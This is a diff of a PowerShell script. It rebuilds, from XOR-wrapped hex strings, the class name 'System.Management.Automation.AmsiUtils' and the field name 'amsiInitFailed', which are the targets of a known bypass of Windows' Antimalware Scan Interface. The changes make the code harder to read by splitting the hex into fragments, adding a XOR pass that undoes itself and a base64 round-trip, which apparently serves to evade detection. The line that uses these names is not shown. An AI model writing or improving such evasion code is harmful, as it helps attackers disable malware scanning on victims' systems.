@@ -8,31 +8,60 @@ function X-HxStr {
     )
 
     $result = @()
-    $hValues = $hxStri -split ' '
+    $hValues = $hxStri -split ' ' | Where-Object { $_ -match '^[A-Fa-f0-9]+$' } 
     $keyValues = $key.ToCharArray()
 
-    for ($i = 0; $i -lt $hValues.Length; $i++) {
-        $xorResult = [convert]::ToByte($hValues[$i], 16) -bxor [char]$keyValues[$i % $keyValues.Length]
-        $result += '{0:X2}' -f $xorResult  
+    if ($hValues.Length -eq 0) {
+        Write-Host "No valid values found."
+        return $null
     }
-    return $result -join ' '  
+
+    for ($i = 0; $i -lt $hValues.Length; $i++) {
+        if ($i % $keyValues.Length -lt $keyValues.Length) {
+            $currentKeyChar = [char]$keyValues[$i % $keyValues.Length]
+
+            try {
+                $byteFromHex = [convert]::ToByte($hValues[$i], 16)
+                $xorResult = $byteFromHex -bxor $currentKeyChar
+                $result += '{0:X2}' -f $xorResult
+            } catch {
+                Write-Host "An error occurred: $_"
+                continue
+            }
+        } else {
+            Write-Host "Index out of range for key values. Check the key length."
+            break
+        }
+    }
+
+    if ($result.Count -eq 0) {
+        Write-Host "No results were produced."
+        return $null
+    } else {
+        return $result -join ' '
+    }
 }
 
-$xK = "1246hhjjjkkgdddd"
 function HToS ($hxarr) {
     return ($hxarr -split ' ' | ForEach-Object { [char][convert]::ToInt16($_, 16) }) -join ''
 }
-$originalAdditionalNamex = "41 6D 73 69 55 74 69 6C 73"
-$originalFieldNameH = "61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"
 
+$xK = "1246hhjjjkkgdddd"
+$part1 = "41 6D"
+$part2 = "73 69"
+$part3 = "55 74 69 6C 73"
+$originalAdditionalNamex = $part1 + " " + $part2 + " " + $part3
+$part4 = "61 6D 73"
+$part5 = "69 49 6E 69 74"
+$part6 = "46 61 69 6C 65 64"
+$originalFieldNameH = $part4 + " " + $part5 + " " + $part6
 $additionalNameH = X-HxStr -hxStri $originalAdditionalNamex -key $xK
 $fieldNameH = X-HxStr -hxStri $originalFieldNameH -key $xK
 $deAdditionalNameH = X-HxStr -hxStri $additionalNameH -key $xK
 $decFiNaH = X-HxStr -hxStri $fieldNameH -key $xK
-
-$baseName = 'System.Management.Automation.'
-$className = $baseName + (HToS $deAdditionalNameH)
+$className = 'System.Management.Automation.' + (HToS $deAdditionalNameH)
 $fieldName = HToS $decFiNaH
+
 $bDecName = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($className))))
 $bDFi = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fieldName))))
 try {
@@ -41,8 +70,6 @@ try {
 } catch {
     Write-Host "An error occurred: $_"
 }
-
-
 
 
 
